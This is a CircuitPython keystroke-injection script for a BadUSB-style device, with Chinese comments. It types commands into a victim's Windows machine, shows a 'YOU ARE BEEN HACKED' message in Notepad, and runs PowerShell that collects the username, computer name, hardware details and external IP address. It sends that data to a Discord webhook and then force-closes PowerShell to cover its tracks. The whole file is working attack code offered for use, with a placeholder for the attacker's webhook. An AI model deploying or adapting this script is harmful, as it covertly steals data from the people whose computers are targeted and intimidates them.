# 作用:
# 縮小所有視窗，開啟記事本並打上"YOU ARE BEEN HACKED"
# 然後透過powershell利用discord webhook傳送電腦硬體資訊/IP地址
# 最後關閉所有powershell視窗
# !!注意!! 這個腳本預設了打開powershell時是中文輸入法，所以會按一下shift，如果想要更改請把第62行刪除
#記得在第68行放入自己的webhook url

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
mouse = Mouse(usb_hid.devices)

def open(word):
    kbd.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.5)
    layout.write(word, delay = 0.1)
    time.sleep(0.5)
    kbd.send(Keycode.ENTER)
    time.sleep(1)

time.sleep(5)

kbd.press(Keycode.WINDOWS)
time.sleep(0.1)
kbd.send(Keycode.D)
time.sleep(0.1)
kbd.release(Keycode.WINDOWS)
time.sleep(0.5)

open("notepad")

kbd.press(Keycode.CONTROL)
time.sleep(0.1)
kbd.send(Keycode.A)
time.sleep(0.1)
kbd.release(Keycode.CONTROL)
time.sleep(0.3)
kbd.send(Keycode.BACKSPACE)
time.sleep(0.5)

kbd.press(Keycode.CONTROL)
time.sleep(0.3)
mouse.move(0, 0, 20) 
time.sleep(0.2)
kbd.release(Keycode.CONTROL)
time.sleep(0.3)
layout.write("YOU ARE BEEN HACKED", delay = 0.1)

open("powershell")
time.sleep(1)
layout.write("Get-Process PowerShell | Stop-Process -Force", delay = 0.05)
time.sleep(0.3)
kbd.send(Keycode.ENTER)
time.sleep(1)
open("powershell")
time.sleep(1)
kbd.send(Keycode.SHIFT)
time.sleep(0.5)

powershell_script = '''
$webhookUrl = "webhook url"
$externalIp = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
$deviceInfo = @{
    ComputerName = $env:COMPUTERNAME
    Username = $env:USERNAME
    OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    CPU = (Get-WmiObject -Class Win32_Processor).Name
    RamGB = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    IPAddress = $externalIp.IP
    GPU = (Get-WmiObject -Class Win32_VideoController | Select-Object -First 1).Name
    HardDrives = Get-WmiObject -Class Win32_DiskDrive | ForEach-Object {
        @{
            Model = $_.Model
            SizeGB = [math]::round($_.Size / 1GB, 2)
        }
    }
    Monitors = Get-WmiObject -Class Win32_DesktopMonitor | ForEach-Object {
        @{
            Name = $_.Name
            ScreenWidth = $_.ScreenWidth
            ScreenHeight = $_.ScreenHeight
        }
    }
}
$deviceInfoMessage = @{
    content = "DEVICE INFO:\n" + ($deviceInfo | ConvertTo-Json -Depth 4)
}
$jsonMessage = $deviceInfoMessage | ConvertTo-Json
$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
$response
'''
for line in powershell_script.splitlines():
    layout.write(line, delay = 0.05)
    kbd.send(Keycode.ENTER)
    time.sleep(0.5)
time.sleep(1)
layout.write("Get-Process PowerShell | Stop-Process -Force", delay = 0.05)
time.sleep(0.3)
kbd.send(Keycode.ENTER)
